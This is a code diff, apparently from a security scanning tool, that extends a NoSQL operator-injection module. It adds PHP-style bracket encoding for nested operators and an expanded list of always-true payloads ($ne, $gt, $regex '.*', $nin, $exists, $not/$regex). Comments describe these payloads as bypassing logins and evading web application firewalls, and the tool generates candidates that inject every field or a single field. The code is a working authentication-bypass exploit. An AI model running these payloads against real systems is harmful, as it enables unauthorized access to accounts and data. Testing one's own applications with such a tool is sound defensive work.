@@ -62,19 +62,38 @@ class Probe:
         self.elapsed = elapsed
 
 
+def _formval(v):
+    if v is True:
+        return "true"
+    if v is False:
+        return "false"
+    if v is None:
+        return ""
+    return v
+
+
+def _form_ops(out, prefix, d):
+    # Encode an operator dict into PHP-style bracket params, recursing for nested
+    # operators (e.g. field[$not][$regex]) and lists (field[$nin][]).
+    for op, v in d.items():
+        key = "%s[%s]" % (prefix, op)
+        if isinstance(v, dict):
+            _form_ops(out, key, v)
+        elif isinstance(v, list):
+            out[key + "[]"] = [_formval(x) for x in v]
+        else:
+            out[key] = _formval(v)
+
+
 def _build_form(fields):
     out = {}
     for name, spec in fields.items():
         if spec[0] == "lit":
-            out[name] = spec[1]
+            out[name] = _formval(spec[1])
         elif spec[0] == "op":
-            out["%s[%s]" % (name, spec[1])] = "" if spec[2] is None else spec[2]
-        else:  # ("ops", {op: val, ...})  e.g. {$regex: ..., $nin: [...]}
-            for op, v in spec[1].items():
-                if isinstance(v, list):
-                    out["%s[%s][]" % (name, op)] = v
-                else:
-                    out["%s[%s]" % (name, op)] = "" if v is None else v
+            out["%s[%s]" % (name, spec[1])] = _formval(spec[2])
+        else:  # ("ops", {op: val, ...}) including nested dicts / lists / bools
+            _form_ops(out, name, spec[1])
     return out
 
 
@@ -85,7 +104,7 @@ def _build_json(fields):
             out[name] = spec[1]
         elif spec[0] == "op":
             out[name] = {spec[1]: spec[2]}
-        else:  # ("ops", {...})
+        else:  # ("ops", {...}) -- nested dicts / lists / bools pass through as JSON
             out[name] = dict(spec[1])
     return out
 
@@ -141,33 +160,49 @@ def _signal(true_p, base_p, noise_len, noise_ratio):
 
 
 def _op_specs():
-    # (label, op, value)  -- value _RANDV means a fresh random per candidate.
+    # (label, {op: value})  -- value _RANDV is replaced with a fresh random.
+    # Every payload here is ALWAYS-TRUE: it makes a field clause match any
+    # document, which is what bypasses a login when applied to all fields.
     return [
-        ("$ne:<rand>", "$ne", _RANDV),
-        ("$gt:''", "$gt", ""),
-        ("$regex:.*", "$regex", ".*"),
-        ("$ne:null", "$ne", None),
+        ("$ne:<rand>",   {"$ne": _RANDV}),
+        ("$ne:null",     {"$ne": None}),
+        ("$gt:''",       {"$gt": ""}),
+        ("$gte:''",      {"$gte": ""}),
+        ("$regex:.*",    {"$regex": ".*"}),
+        ("$nin:[rand]",  {"$nin": [_RANDV]}),
+        ("$exists:true", {"$exists": True}),
+        ("$not/$regex",  {"$not": {"$regex": "^$"}}),   # non-empty; also $not WAF evasion
     ]
 
 
 def _resolve(v):
-    return _rand() if v is _RANDV else v
+    if v is _RANDV:
+        return _rand()
+    if isinstance(v, list):
+        return [_resolve(x) for x in v]
+    if isinstance(v, dict):
+        return {k: _resolve(x) for k, x in v.items()}
+    return v
+
+
+def _resolve_ops(opdict):
+    return {k: _resolve(v) for k, v in opdict.items()}
 
 
 def _candidates(fields_literal):
     names = list(fields_literal.keys())
     cands = []
-    # A) auth-bypass: operator-inject EVERY field simultaneously.
-    for lbl, op, val in _op_specs():
-        spec = {n: ("op", op, _resolve(val)) for n in names}
+    # A) auth-bypass: apply an always-true operator to EVERY field at once.
+    for lbl, od in _op_specs():
+        spec = {n: ("ops", _resolve_ops(od)) for n in names}
         cands.append(("all-fields %s" % lbl, spec))
     # B) single-field: inject one field, keep the rest at their real values
     #    (covers data endpoints like ?id=5 -> id[$ne]).
     if len(names) > 1:
         for f in names:
-            for lbl, op, val in _op_specs():
+            for lbl, od in _op_specs():
                 spec = {n: ("lit", fields_literal[n]) for n in names}
-                spec[f] = ("op", op, _resolve(val))
+                spec[f] = ("ops", _resolve_ops(od))
                 cands.append(("%s %s" % (f, lbl), spec))
     return cands
 
